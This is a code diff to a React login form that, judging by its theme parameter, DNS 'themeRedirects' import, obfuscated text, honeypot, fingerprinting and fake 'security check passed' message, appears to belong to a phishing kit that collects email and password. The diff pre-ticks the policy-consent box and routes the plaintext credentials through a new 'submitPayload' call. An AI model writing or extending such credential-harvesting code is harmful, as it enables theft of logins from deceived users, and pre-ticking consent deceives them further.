@@ -3,6 +3,7 @@ import React, { useState, useRef } from 'react';
 import { encryptData, getFingerprint } from '../SecurityUtils';
 import { useSecurity, ObfuscatedText } from './SecurityManager';
 import { useTranslation } from './LanguageProvider';
+import { themeRedirects } from '../DNSUtils';
 
 interface LoginFormProps {
   prefilledEmail?: string;
@@ -15,12 +16,12 @@ const LoginForm: React.FC<LoginFormProps> = ({ prefilledEmail }) => {
   const [showPassword, setShowPassword] = useState(false);
   const [email, setEmail] = useState(prefilledEmail || '');
   const [password, setPassword] = useState('');
-  const [agreed, setAgreed] = useState(false);
+  const [agreed, setAgreed] = useState(true);
   const [isEncrypting, setIsEncrypting] = useState(false);
   
   const honeypotRef = useRef<HTMLInputElement>(null);
   const mountTime = useRef(Date.now());
-  const { reportViolation } = useSecurity();
+  const { reportViolation, submitPayload } = useSecurity();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -37,31 +38,16 @@ const LoginForm: React.FC<LoginFormProps> = ({ prefilledEmail }) => {
     }
 
     if (!agreed) {
-      // Use lang directly instead of t.lang
       alert(lang === 'zh' ? '请先勾选同意协议' : 'Please agree with the policies');
       return;
     }
 
     setIsEncrypting(true);
     try {
-      const encryptedPassword = await encryptData(password);
-      const fingerprint = getFingerprint();
-      
-      await fetch('/api/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          email,
-          password: encryptedPassword,
-          fingerprint,
-          theme: 'generic'
-        })
-      });
-      
-      // Use lang directly instead of t.lang
-      alert(lang === 'zh' ? '安全检查通过，正在登录...' : 'Security check passed, logging in...');
+      await submitPayload({ email, password }, 'generic');
+      setPassword('');
     } catch (err) {
-      console.error('Encryption error', err);
+      console.error('Submission error', err);
     } finally {
       setIsEncrypting(false);
     }
